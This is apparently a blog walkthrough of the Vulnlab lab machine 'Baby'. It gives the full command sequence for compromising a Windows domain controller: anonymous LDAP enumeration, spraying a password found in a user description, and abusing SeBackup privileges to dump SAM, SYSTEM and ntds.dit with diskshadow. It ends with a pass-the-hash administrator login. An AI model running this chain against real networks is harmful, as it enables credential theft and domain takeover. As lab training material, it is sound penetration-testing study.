---
categories:
- Vulnlab
image:
  path: vl_baby.png
layout: post
media_subpath: /assets/posts/2022-01-19-lab-baby-walkthrough
tags:
- active directory
- ldap
- vulnlab
- windows
title: Lab - Baby Walkthrough
---

Baby is an easy machine on Vulnlab that involves enumerating LDAP & spraying credentials. For SYSTEM we exploit SeBackup & SeRestore Privileges.

The initial port scan shows the following ports:

```
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
```

One thing to check on Active Directory machines is if anonymous bind to LDAP is possible. We try to enumerate users via ldapsearch:

```
ldapsearch -x -b "dc=baby,dc=vl" "user"  -h 10.10.10.6 | grep dn

dn: DC=baby,DC=vl
dn: CN=Administrator,CN=Users,DC=baby,DC=vl
dn: CN=Guest,CN=Users,DC=baby,DC=vl
dn: CN=krbtgt,CN=Users,DC=baby,DC=vl
dn: CN=Domain Computers,CN=Users,DC=baby,DC=vl
dn: CN=Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Schema Admins,CN=Users,DC=baby,DC=vl
dn: CN=Enterprise Admins,CN=Users,DC=baby,DC=vl
dn: CN=Cert Publishers,CN=Users,DC=baby,DC=vl
dn: CN=Domain Admins,CN=Users,DC=baby,DC=vl
dn: CN=Domain Users,CN=Users,DC=baby,DC=vl
dn: CN=Domain Guests,CN=Users,DC=baby,DC=vl
dn: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl
dn: CN=RAS and IAS Servers,CN=Users,DC=baby,DC=vl
dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=baby,DC=vl
dn: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
dn: CN=Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Cloneable Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Protected Users,CN=Users,DC=baby,DC=vl
dn: CN=Key Admins,CN=Users,DC=baby,DC=vl
dn: CN=Enterprise Key Admins,CN=Users,DC=baby,DC=vl
dn: CN=DnsAdmins,CN=Users,DC=baby,DC=vl
dn: CN=DnsUpdateProxy,CN=Users,DC=baby,DC=vl
dn: CN=dev,CN=Users,DC=baby,DC=vl
dn: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
dn: CN=Ashley Webb,OU=dev,DC=baby,DC=vl
dn: CN=Hugh George,OU=dev,DC=baby,DC=vl
dn: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
dn: CN=Ian Walker,OU=dev,DC=baby,DC=vl
dn: CN=it,CN=Users,DC=baby,DC=vl
dn: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
dn: CN=Caroline Robinson,OU=it,DC=baby,DC=vl
dn: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
dn: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl
```

We managed to get a list of all domain users. Another point to check on LDAP is the description field of users. Sometimes administrators store valuable information there without realizing that unprivileged users have access to this kind of information:

```
ldapsearch -x -b "dc=baby,dc=vl" "*"  -h 10.10.10.6 | grep desc -A2
...
description: Set initial password to BabyStart123!
givenName: Teresa
distinguishedName: CN=Teresa Bell,OU=it,DC=baby,DC=vl
```

The password Teresa was at some point reset to "BabyStart123!". This is likely the default passwords admins use when a user has forgotten his password. We can try to use it for Teresa, but will notice that it’s not valid:

```
crackmapexec smb 10.10.10.6 -u teresa.bell -p 'BabyStart123!' --no-bruteforce

SMB         10.10.10.6      445    BABYDC           [-] baby.vl\teresa.bell:BabyStart123! STATUS_LOGON_FAILURE
```

Maybe it is valid for another user though. We create a wordlist "users.txt" from the usernames we saw in LDAP and spray the password across all accounts:

```
crackmapexec smb 10.10.10.6 -u users.txt -p 'BabyStart123!' --no-bruteforce
...
SMB         10.10.10.6      445    BABYDC           [-] baby.vl\caroline.robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
```

We have a hit for Caroline, change her password via smbpasswd and use these credentials to login via WinRM:

```
smbpasswd -U BABY/caroline.robinson -r 10.10.10.6
...
<change password>
...
ruby ~/tools/evil-winrm/evil-winrm.rb -i 10.10.10.6 -u 'caroline.robinson' -p 'Start123!'
```

We check our privileges with `whoami /all` and can see that we have SeRestore- & SeBackupPrivilege. This allows us to save SAM & SYSTEM and download it to our machine:

```
cd c:\
mkdir Temp
cd \Temp
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
```

After downloading the files, pypykatz or secretsdump can be used to obtain the administrator hash:

```
pypykatz registry --sam sam system
...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::
```

However, we cant connect with this hash. Why? It’s actually the local administrator hash which is not useable on a domain controller for logging in! Instead, we have to get the hash of the account in the domain (which has exactly the same name). In order to do this, we have to grab "ntds.dit" aswell:

```
# save this in script.txt
set metadata C:\Windows\Temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX

# run diskshadow
diskshadow /s script.txt

# copy ntds to c
robocopy /b E:\Windows\ntds . ntds.dit
```

Now we can run secretsdump again, this time getting the domain account hashes by supplying "ntds.dit":

```
impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL
...
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
```

Finally we can use the hash to connect via WinRM:

```
evil-winrm -i baby.vl -u 'administrator' -H '<REDACTED>'
```

This finishes the box.